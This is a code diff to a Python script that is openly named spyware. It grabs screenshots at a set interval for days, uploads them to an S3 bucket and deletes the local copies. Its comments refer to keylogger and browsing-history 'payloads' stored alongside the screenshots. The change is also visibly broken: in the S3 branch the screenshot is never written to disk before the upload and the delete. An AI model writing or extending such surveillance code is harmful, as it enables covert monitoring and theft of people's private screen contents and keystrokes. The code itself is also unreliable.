@@ -24,15 +24,18 @@ def main(args):
     end_date = timedelta(days=duration) + cur_date
     delta = timedelta(seconds=interval)
 
+    os.mkdir(output_dir+'/outputs')
+    os.mkdir(output_dir + '/outputs/screenshots')
     while cur_date <= end_date:
         im = screenshot.grab()
         file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.png'
-        fp = output_dir + '/' + file_name
-        im.save(fp)
-        # save to the cloud and rm file locally
+        fp = output_dir + '/outputs/screenshots' + '/' + file_name
+        #save payloads to s3
         if s3_bucket != "":
             utils.save_to_s3(fp, file_name)
             os.remove(fp)
+        else: #save all payloads (keylogger, history, output files) to output dir
+            im.save(fp)
 
         time.sleep(int(interval))
 
@@ -51,7 +54,7 @@ if __name__ == '__main__':
                       help = "The duration of the script in days")
     parser.add_argument("-i", "--interval", type=int, default=10,
                       help = "The interval of the screenshots in seconds")
-    parser.add_argument("-o", "--output_dir", default=os.environ['HOME'],
+    parser.add_argument("-o", "--output_dir", default=os.getcwd(),
                       help = "The output directory of the screenshots")
     parser.add_argument("-s3", "--s3_bucket", default="",
                       help = "The output directory of the screenshots")
